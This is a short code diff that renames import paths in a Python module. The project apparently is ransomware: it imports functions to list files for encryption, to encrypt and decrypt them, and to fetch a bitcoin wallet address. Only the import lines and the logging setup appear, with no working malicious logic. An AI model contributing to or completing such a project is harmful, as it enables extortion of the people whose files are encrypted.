@@ -1,8 +1,8 @@
 import logging
 from core.encrypt_files import start_encryption
 from core.decrypt_files import start_decryption
-from core.comms.payment import get_bitcoin_wallet_address
-from core.utils import get_files_to_be_encrypted
+from core.comms.bitcoin_address import get_bitcoin_wallet_address
+from core.utils.file_ops import get_files_to_be_encrypted
 
 logging.basicConfig(
     format="%(asctime)s %(module)s %(levelname)s: %(message)s", level=logging.INFO
